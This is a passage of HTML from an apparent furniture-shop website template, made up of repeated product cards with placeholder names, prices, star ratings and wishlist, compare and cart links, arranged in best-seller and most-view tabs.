										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/5.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 56.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/6.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 36.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/3.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/7.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 57.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/1_3.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 55.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/2.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 65.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/8.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 60.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/9.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
									</div>
								</div>
								<div class="tab-pane" id="best-seller">
									<div class="row">
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/2.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 56.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/9.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 36.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/8.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/6.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 57.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/4.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 55.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/3.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 65.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/7.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 60.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/5.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
									</div>
								</div>
								<div class="tab-pane" id="most-view">
									<div class="row">
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/1_3.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 56.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/3.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 36.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/5.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/9.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 57.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/7.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 55.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/5.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 65.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
